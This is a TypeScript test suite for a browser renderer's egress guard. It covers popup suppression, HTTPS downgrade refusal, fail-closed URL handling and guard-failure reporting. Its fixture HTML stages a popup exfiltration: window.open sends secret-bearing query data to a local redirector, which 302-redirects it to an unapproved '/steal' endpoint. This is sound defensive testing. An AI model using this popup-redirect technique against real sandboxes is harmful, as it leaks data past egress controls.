/**
 * browser-egress-scope.test.ts — regression coverage for the three ways the browser lane's egress
 * policy could be stepped around WITHOUT the receipt saying so.
 *
 * Previously observed failure modes, fixed before 0.1.0:
 *
 * 1. POPUPS RENDERED OUTSIDE THE GUARD. `attachBrowserRedirectGuard` opens one CDP session against
 *    one target. A `window.open()` popup is a different target, and Playwright never routes
 *    redirect hops, so a redirect inside a popup was enforced by nobody: an approved origin
 *    answering `302 Location: http://never-approved/...` reached that origin with attacker-chosen
 *    query data while `blockedRequests` stayed empty and the receipt reported `passed` with zero
 *    warnings. Silent, which is worse than failing. Attaching a guard from `context.on("page")`
 *    does not fix it — the attach is asynchronous and the popup's first request is already in
 *    flight. The fix suppresses secondary pages at the route layer, which Playwright installs
 *    before the popup runs, and records the popup so a `passed` receipt is impossible.
 *
 * 2. THE DOWNGRADE INVARIANT ONLY COVERED 3xx. The guard gates on redirect status codes and the
 *    route arm keyed off `redirectedFrom()`. A `Refresh:` response header, a `<meta
 *    http-equiv=refresh>` or a scripted `location` write produces a FRESH first request with
 *    `redirectedFrom() === null`, so an approved `https://a` moved the render onto an approved
 *    `http://b` with no warning — the exact transition SECURITY.md says is refused.
 *
 * 3. A GUARD THAT DIED MID-RENDER SAID NOTHING. Interception stopped and the receipt still read
 *    `passed`.
 *
 * HTTPS cases are unit-driven for the reason the sibling suite already documents: a real TLS hop
 * cannot be staged against the plain-HTTP servers a test suite can run. The popup case is driven
 * live, through the shipped render entry point, because "the pooled page is guarded" was exactly
 * the assumption that made the hole invisible.
 */
import { createServer, type Server } from "node:http";
import { mkdir, mkdtemp, realpath, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { BrowserContext, Page } from "playwright-core";
import { afterEach, describe, expect, it } from "vitest";
import { loadMotionPackage } from "@shellx-motion/core";
import { attachBrowserRedirectGuard } from "./browser-redirect-guard";
import {
  authorizeBrowserRouteRequest,
  createApprovedAgentScriptProvenanceAuthority,
  createBrowserDocumentSchemeMemory,
  createHostBoundBrowserFrameRenderer,
  type BrowserFrameNetworkState,
  type BrowserRoutePolicy,
  type RoutedBrowserRequest
} from "./index";

const tempDirs: string[] = [];

async function temporaryRoot(prefix: string): Promise<string> {
  return await mkdtemp(join(await realpath(tmpdir()), prefix));
}

afterEach(async () => {
  await Promise.all(tempDirs.splice(0).map((dir) => rm(dir, { recursive: true, force: true })));
});

const RENDER_PAGE = { id: "render-page" };
const POPUP_PAGE = { id: "popup-page" };

function freshNetworkState(): BrowserFrameNetworkState {
  return {
    blockedRequests: [],
    blockedWebSocketRequests: [],
    blockedExternalFileRequest: false,
    blockedDowngradeRedirects: [],
    blockedSecondaryPages: [],
    blockedForeignPageRequests: [],
    redirectGuardFailures: []
  };
}

function policyFor(options: {
  allowedOrigins?: string[];
  documentScheme?: ReturnType<typeof createBrowserDocumentSchemeMemory>;
  denySecondaryExecutableRequests?: boolean;
} = {}): BrowserRoutePolicy {
  return {
    allowedOrigins: new Set(options.allowedOrigins ?? []),
    packageRootPath: "/nonexistent-package-root",
    renderPage: RENDER_PAGE,
    documentScheme: options.documentScheme ?? createBrowserDocumentSchemeMemory(),
    ...(options.denySecondaryExecutableRequests ? { denySecondaryExecutableRequests: true } : {})
  };
}

/** A request reporting a real originating frame, the way every live Playwright request does. */
function framedRequest(url: string, frame: { url(): string; page(): unknown }, navigation = true): RoutedBrowserRequest {
  return { url: () => url, redirectedFrom: () => null, isNavigationRequest: () => navigation, frame: () => frame };
}

function frameOn(documentUrl: string, page: unknown = RENDER_PAGE): { url(): string; page(): unknown } {
  return { url: () => documentUrl, page: () => page };
}

describe("secondary-page (popup) egress suppression", () => {
  it("refuses a request issued by a page that is not the captured page", async () => {
    // The finding's shape reduced to its decision: the origin is host-approved, so an origin-only
    // check continues it. What makes it inadmissible is that it came from a popup.
    const state = freshNetworkState();

    const verdict = await authorizeBrowserRouteRequest(
      framedRequest("http://approved.example/go?d=secret", frameOn("about:blank", POPUP_PAGE)),
      policyFor({ allowedOrigins: ["http://approved.example"] }),
      state
    );

    expect(verdict).toBe("abort");
    expect(state.blockedForeignPageRequests).toEqual(["http://approved.example"]);
    // Reason-class precision: this is not an undeclared origin, and the receipt must not say so.
    expect(state.blockedRequests).toEqual([]);
  });

  it("records only the origin of a refused popup request, never its query string", async () => {
    // A popup URL is attacker-chosen and is exactly where exfiltrated data would sit (TM-007).
    const state = freshNetworkState();

    await authorizeBrowserRouteRequest(
      framedRequest("http://approved.example/steal?d=SECRET-VALUE", frameOn("about:blank", POPUP_PAGE)),
      policyFor({ allowedOrigins: ["http://approved.example"] }),
      state
    );

    expect(state.blockedForeignPageRequests.join(" ")).not.toContain("SECRET-VALUE");
  });

  it("refuses a request whose frame cannot be read", async () => {
    // Fail closed: an unreadable origin is not a same-page origin.
    const state = freshNetworkState();
    const request: RoutedBrowserRequest = {
      url: () => "http://approved.example/a",
      redirectedFrom: () => null,
      isNavigationRequest: () => false,
      frame: () => { throw new Error("target closed"); }
    };

    expect(await authorizeBrowserRouteRequest(request, policyFor({ allowedOrigins: ["http://approved.example"] }), state)).toBe("abort");
    expect(state.blockedForeignPageRequests).toEqual(["http://approved.example"]);
  });

  it("still allows an approved request from the captured page and its iframes", async () => {
    const state = freshNetworkState();

    const verdict = await authorizeBrowserRouteRequest(
      framedRequest("http://approved.example/pixel.svg", frameOn("http://approved.example/inner.html"), false),
      policyFor({ allowedOrigins: ["http://approved.example"] }),
      state
    );

    expect(verdict).toBe("continue");
    expect(state).toEqual(freshNetworkState());
  });

  /**
   * The load-bearing wiring proof, and the test whose absence made this finding invisible: the
   * existing live coverage only ever drove the pooled page. Here a real popup is opened by real
   * package HTML through the shipped render entry point, and BOTH servers must stay untouched —
   * the never-approved redirect target because that is the exfiltration, and the approved
   * redirector because a suppressed popup should not reach the network at all.
   */
  it("refuses popup egress end to end and refuses to report the frame as passed", async () => {
    let unapprovedHits = 0;
    const unapproved = createServer((_req, res) => {
      unapprovedHits += 1;
      res.writeHead(200, { "content-type": "text/html" });
      res.end("<!doctype html>landed");
    });
    const unapprovedOrigin = await listen(unapproved);
    let popupTargetHits = 0;
    let pixelHits = 0;
    const redirector = createServer((req, res) => {
      if (req.url?.startsWith("/go")) {
        popupTargetHits += 1;
        res.writeHead(302, { location: `${unapprovedOrigin}/steal?d=SECRET-FROM-POPUP` });
        res.end();
        return;
      }
      pixelHits += 1;
      res.writeHead(200, { "content-type": "image/svg+xml" });
      res.end(`<svg xmlns="http://www.w3.org/2000/svg" width="8" height="8"><rect width="8" height="8" fill="#22c55e"/></svg>`);
    });
    const approvedOrigin = await listen(redirector);
    const root = await writePopupBrowserPackage(approvedOrigin);
    const pkg = await loadMotionPackage(root);
    const outDir = await temporaryRoot("shellx-motion-browser-popup-");
    const stateRoot = await temporaryRoot("shellx-motion-browser-popup-authority-");
    tempDirs.push(root, outDir, stateRoot);
    const authority = createApprovedAgentScriptProvenanceAuthority({ stateRoot });
    await authority.mint({ package: pkg });
    const renderApproved = createHostBoundBrowserFrameRenderer({ agentScriptAuthority: authority });

    try {
      const result = await renderApproved(pkg, {
        atMs: 0,
        outDir,
        networkAccess: { approvedOrigins: [approvedOrigin], allowPrivateNetwork: true }
      });

      // Pre-egress evidence: neither the exfiltration target nor the approved redirector the popup
      // aimed at was ever contacted, while the captured page's own approved subresource still loaded.
      expect(unapprovedHits).toBe(0);
      expect(popupTargetHits).toBe(0);
      expect(pixelHits).toBeGreaterThan(0);
      expect(result.receipt.status).not.toBe("passed");
      // Chromium's event order is platform-dependent here: some builds emit the context `page`
      // event before the refused first popup request, while Windows can abort that request before
      // the popup becomes an observable page. Both warnings prove the same shipped invariant: the
      // request came from outside the captured page and was refused before egress.
      expect(result.receipt.warnings.some((warning) =>
        warning.startsWith("Blocked browser popup or secondary page:")
        || warning.startsWith("Blocked browser request from a page other than the captured page:")
      )).toBe(true);
      expect(result.receipt.warnings.some((warning) => warning.includes("SECRET-FROM-POPUP"))).toBe(false);
    } finally {
      await closeServer(redirector);
      await closeServer(unapproved);
    }
  }, 45_000);
});

describe("approved-agent-entry secondary executable suppression", () => {
  it("refuses secondary script and worker resources while preserving data assets", async () => {
    const policy = policyFor({ denySecondaryExecutableRequests: true });
    const codeRequest = (kind: "script" | "worker"): RoutedBrowserRequest => ({
      url: () => "data:text/javascript,secondary%20code",
      redirectedFrom: () => null,
      isNavigationRequest: () => false,
      frame: () => frameOn("file:///package/entry.html"),
      resourceType: () => kind
    });
    const state = freshNetworkState();
    await expect(authorizeBrowserRouteRequest(codeRequest("script"), policy, state)).resolves.toBe("abort");
    await expect(authorizeBrowserRouteRequest(codeRequest("worker"), policy, state)).resolves.toBe("abort");
    const childDocument: RoutedBrowserRequest = {
      ...codeRequest("script"),
      resourceType: () => "document",
      isNavigationRequest: () => true,
      frame: () => ({ ...frameOn("file:///package/child.html"), parentFrame: () => frameOn("file:///package/entry.html") })
    };
    await expect(authorizeBrowserRouteRequest(childDocument, policy, state)).resolves.toBe("abort");
    expect(state.blockedSecondaryCodeRequests).toEqual(["script", "worker", "document"]);

    const image: RoutedBrowserRequest = { ...codeRequest("script"), resourceType: () => "image" };
    await expect(authorizeBrowserRouteRequest(image, policy, freshNetworkState())).resolves.toBe("continue");
  });
});

describe("https document downgrade refusal (non-redirect shapes)", () => {
  it("refuses an https document navigating itself onto an approved cleartext origin", async () => {
    // What a `Refresh:` header or `<meta http-equiv=refresh>` produces: a fresh navigation with no
    // redirectedFrom(), so the pre-fix code judged it on origin membership and let it through.
    const state = freshNetworkState();

    const verdict = await authorizeBrowserRouteRequest(
      framedRequest("http://cleartext.example/landing", frameOn("https://secure.example/refresh")),
      policyFor({ allowedOrigins: ["https://secure.example", "http://cleartext.example"] }),
      state
    );

    expect(verdict).toBe("abort");
    expect(state.blockedDowngradeRedirects).toEqual(["https://secure.example -> http://cleartext.example"]);
    expect(state.blockedRequests).toEqual([]);
  });

  it("refuses the retry Chromium issues from the error page after the first refusal", async () => {
    // Measured behaviour, and the reason the rule cannot read only the live frame URL: a refused
    // navigation commits `chrome-error://chromewebdata/`, and the re-issued navigation reports
    // that as its frame URL. Trusting the frame URL alone let the second attempt reach the wire.
    const policy = policyFor({ allowedOrigins: ["https://secure.example", "http://cleartext.example"] });
    // One frame object whose committed URL changes, as a live Playwright Frame does.
    let frameUrl = "about:blank";
    const frame = { url: () => frameUrl, page: () => RENDER_PAGE };

    // 1. The https document loads and is remembered.
    const load = await authorizeBrowserRouteRequest(framedRequest("https://secure.example/refresh", frame), policy, freshNetworkState());
    frameUrl = "https://secure.example/refresh";
    // 2. Its Refresh: header aims the frame at cleartext; refused on the live frame URL.
    const firstState = freshNetworkState();
    const first = await authorizeBrowserRouteRequest(framedRequest("http://cleartext.example/landing", frame), policy, firstState);
    // 3. Chromium commits an error page and re-issues the navigation from it.
    frameUrl = "chrome-error://chromewebdata/";
    const retryState = freshNetworkState();
    const retry = await authorizeBrowserRouteRequest(framedRequest("http://cleartext.example/landing", frame), policy, retryState);

    expect(load).toBe("continue");
    expect(first).toBe("abort");
    expect(firstState.blockedDowngradeRedirects).toEqual(["https://secure.example -> http://cleartext.example"]);
    expect(retry).toBe("abort");
    expect(retryState.blockedDowngradeRedirects).toEqual(["https://secure.example -> http://cleartext.example"]);
  });

  it("does not treat an approved cleartext subresource of an https document as a downgrade", async () => {
    // Mixed content is Chromium's own boundary; the invariant here is about documents, and a
    // false positive would refuse traffic the host explicitly approved.
    const state = freshNetworkState();

    const verdict = await authorizeBrowserRouteRequest(
      framedRequest("http://cleartext.example/pixel.svg", frameOn("https://secure.example/page"), false),
      policyFor({ allowedOrigins: ["https://secure.example", "http://cleartext.example"] }),
      state
    );

    expect(verdict).toBe("continue");
    expect(state).toEqual(freshNetworkState());
  });

  it("keeps a first navigation to an approved cleartext origin working", async () => {
    // Approving an http origin as a DIRECT target stays the host's deliberate choice; nothing
    // secure has been committed in this frame, so there is no transition to refuse.
    const state = freshNetworkState();

    const verdict = await authorizeBrowserRouteRequest(
      framedRequest("http://cleartext.example/index.html", frameOn("about:blank")),
      policyFor({ allowedOrigins: ["http://cleartext.example"] }),
      state
    );

    expect(verdict).toBe("continue");
    expect(state).toEqual(freshNetworkState());
  });
});

describe("route authorization fails closed on an unparseable URL", () => {
  it("refuses a request whose URL yields no origin instead of continuing it", async () => {
    // The pre-fix arm read `if (!origin || ...) return "continue"` inside a function documented
    // "Fails closed", while its sibling in the redirect guard aborted on the identical condition.
    const state = freshNetworkState();

    const verdict = await authorizeBrowserRouteRequest(
      framedRequest(":::not-a-url", frameOn("about:blank"), false),
      policyFor({ allowedOrigins: ["http://approved.example"] }),
      state
    );

    expect(verdict).toBe("abort");
    expect(state.blockedRequests).toEqual([":::not-a-url (unparseable request URL)"]);
  });
});

describe("redirect guard liveness failsafe", () => {
  it("observes only HTTP(S) responses, leaving snapshot-fulfilled package files to the route layer", async () => {
    const { context, page, sent } = fakeGuardTarget();

    await attachBrowserRedirectGuard(context, page, new Set<string>(), () => freshNetworkState());

    expect(sent).toContainEqual({
      method: "Fetch.enable",
      params: {
        patterns: [
          { urlPattern: "http://*", requestStage: "Response" },
          { urlPattern: "https://*", requestStage: "Response" }
        ]
      }
    });
  });

  it("records a mid-render CDP detach so the frame cannot report passed", async () => {
    const { context, page, cdp } = fakeGuardTarget();
    const state = freshNetworkState();
    await attachBrowserRedirectGuard(context, page, new Set<string>(), () => state);

    cdp.emit("Inspector.detached", { reason: "target_closed" });

    expect(state.redirectGuardFailures).toEqual(["redirect guard CDP session detached"]);
  });

  it("records a guarded page that closes mid-render", async () => {
    const { context, page, emitPageEvent } = fakeGuardTarget();
    const state = freshNetworkState();
    await attachBrowserRedirectGuard(context, page, new Set<string>(), () => state);

    emitPageEvent("close");

    expect(state.redirectGuardFailures).toEqual(["guarded page closed"]);
  });

  it("stays silent when the guard dies between leases", async () => {
    // Ordinary teardown closes the page with no frame leased; a warning there would be noise on
    // every successful render, which is how a real failsafe gets disabled by its own false alarms.
    const { context, page, emitPageEvent } = fakeGuardTarget();
    const state = freshNetworkState();
    await attachBrowserRedirectGuard(context, page, new Set<string>(), () => undefined);

    emitPageEvent("close");

    expect(state.redirectGuardFailures).toEqual([]);
  });
});

/** Minimal CDP-session / page / context doubles: the failsafe is pure event wiring. */
function fakeGuardTarget(): {
  context: BrowserContext;
  page: Page;
  cdp: { emit(event: string, payload?: unknown): void };
  sent: Array<{ method: string; params: Record<string, unknown> }>;
  emitPageEvent(event: string): void;
} {
  const cdpListeners = new Map<string, Array<(payload?: unknown) => void>>();
  const pageListeners = new Map<string, Array<() => void>>();
  const sent: Array<{ method: string; params: Record<string, unknown> }> = [];
  const cdp = {
    on(event: string, listener: (payload?: unknown) => void) { cdpListeners.set(event, [...(cdpListeners.get(event) ?? []), listener]); return cdp; },
    async send(method: string, params: Record<string, unknown>) { sent.push({ method, params }); return {}; },
    emit(event: string, payload?: unknown) { for (const listener of cdpListeners.get(event) ?? []) listener(payload); }
  };
  const page = {
    once(event: string, listener: () => void) { pageListeners.set(event, [...(pageListeners.get(event) ?? []), listener]); return page; }
  };
  const context = { async newCDPSession() { return cdp; } };
  return {
    context: context as unknown as BrowserContext,
    page: page as unknown as Page,
    cdp,
    sent,
    emitPageEvent: (event: string) => { for (const listener of pageListeners.get(event) ?? []) listener(); }
  };
}

async function listen(server: Server): Promise<string> {
  await new Promise<void>((resolvePromise) => server.listen(0, "127.0.0.1", resolvePromise));
  const address = server.address();
  if (!address || typeof address === "string") throw new Error("Expected local test server address.");
  return `http://127.0.0.1:${address.port}`;
}

async function closeServer(server: Server): Promise<void> {
  await new Promise<void>((resolvePromise, reject) => server.close((error) => error ? reject(error) : resolvePromise()));
}

/**
 * Writes a browser package whose HTML opens a popup onto `${requestOrigin}/go` — an endpoint the
 * caller's server answers with a 302 to a never-approved origin — while the captured page itself
 * loads an approved pixel, so the test also proves the normal path is untouched.
 */
async function writePopupBrowserPackage(requestOrigin: string): Promise<string> {
  const root = await temporaryRoot("shellx-motion-browser-popup-package-");
  await mkdir(root, { recursive: true });
  await writeFile(
    join(root, "manifest.json"),
    `${JSON.stringify({
      schema: "shellx-motion/package-manifest@1",
      id: "pkg_browser_popup",
      name: "Browser Popup",
      motion: "motion.json",
      assets: ["card.html"],
      sourceApp: "shellx-motion",
      compatibility: { lanes: ["browser"], hosts: ["motion"] }
    }, null, 2)}\n`
  );
  await writeFile(
    join(root, "motion.json"),
    `${JSON.stringify({
      schema: "shellx-motion/motion@1",
      id: "motion_browser_popup",
      name: "Browser Popup",
      durationMs: 1000,
      fps: 30,
      width: 320,
      height: 180,
      background: "#ffffff",
      layers: [
        { id: "web-card", type: "web", source: "card.html", startMs: 0, durationMs: 1000, allowedOrigins: [requestOrigin] }
      ],
      assets: [],
      provenance: { sourceApp: "shellx-motion", createdBy: "test" },
      "x-shellx-motion-script-execution": {
        schema: "shellx-motion/script-execution-request@1",
        requestedMode: "trusted-local-agent-authored"
      }
    }, null, 2)}\n`
  );
  await writeFile(
    join(root, "card.html"),
    "<!doctype html><html><body data-composition-id=\"browser-popup\" data-start=\"0\" data-duration=\"1000\">"
    + "<main data-layer-id=\"title\" data-start=\"0\" data-duration=\"1000\" style=\"font: 32px sans-serif\">Popup probe</main>"
    + `<img src="${requestOrigin}/pixel.svg" width="8" height="8">`
    + `<script>window.open(${JSON.stringify(`${requestOrigin}/go?d=SECRET-FROM-POPUP`)}, "_blank");</script>`
    + "</body></html>\n"
  );
  return root;
}
